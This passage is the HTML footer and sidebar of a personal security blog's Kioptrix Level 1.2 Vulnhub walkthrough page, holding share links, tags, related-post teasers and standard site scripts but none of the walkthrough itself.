href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=KIOPTRIX LEVEL 1.2 (#3) - Vulnhub Walkthrough - Mohamed Ayman&url=http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1.2/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=KIOPTRIX LEVEL 1.2 (#3) - Vulnhub Walkthrough - Mohamed Ayman&u=http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1.2/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=KIOPTRIX LEVEL 1.2 (#3) - Vulnhub Walkthrough - Mohamed Ayman&url=http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1.2/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Bypass-30X-redirect-with-BurpSuite/">Bypass 30X redirect with BurpSuite</a><li><a href="/posts/TOPPO/">TOPPO - Vulnhub Walkthrough</a><li><a href="/posts/ESCALATE-LINUX/">ESCALATE LINUX - Vulnhub Walkthrough</a><li><a href="/posts/KIOPTRIX_LEVEL_1/">KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough</a><li><a href="/posts/KIOPTRIX_LEVEL_1.1/">KIOPTRIX LEVEL 1.1 (#2) - Vulnhub Walkthrough</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege_escalation</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/kioptrix/">kioptrix</a> <a class="post-tag" href="/tags/escalate-my-privileges/">ESCALATE_MY_PRIVILEGES</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/30x/">30x</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/KIOPTRIX_LEVEL_1.3/"><div class="card-body"> <span class="timeago small" > Jul 22 <i class="unloaded">2021-07-22T05:35:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>KIOPTRIX LEVEL 1.3 (#4) - Vulnhub Walkthrough</h3><div class="text-muted small"><p> Introduction This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of t...</p></div></div></a></div><div class="card"> <a href="/posts/KIOPTRIX_LEVEL_1/"><div class="card-body"> <span class="timeago small" > Jul 19 <i class="unloaded">2021-07-19T09:46:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough</h3><div class="text-muted small"><p> Introduction This Kioptrix: Level 1 VM Image is rated as Easy/Beginner level challenge. The objective of the game is to acquire root access via any means possible. The purpose of the game is to le...</p></div></div></a></div><div class="card"> <a href="/posts/KIOPTRIX_LEVEL_1.1/"><div class="card-body"> <span class="timeago small" > Jul 19 <i class="unloaded">2021-07-19T23:42:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>KIOPTRIX LEVEL 1.1 (#2) - Vulnhub Walkthrough</h3><div class="text-muted small"><p> Introduction This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/KIOPTRIX_LEVEL_1.1/" class="btn btn-outline-primary" prompt="Older"><p>KIOPTRIX LEVEL 1.1 (#2) - Vulnhub Walkthrough</p></a> <a href="/posts/KIOPTRIX_LEVEL_1.3/" class="btn btn-outline-primary" prompt="Newer"><p>KIOPTRIX LEVEL 1.3 (#4) - Vulnhub Walkthrough</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/maaelhamid">Mohamed Ayman</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege_escalation</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/kioptrix/">kioptrix</a> <a class="post-tag" href="/tags/escalate-my-privileges/">ESCALATE_MY_PRIVILEGES</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/30x/">30x</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://maaelhamid.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script>
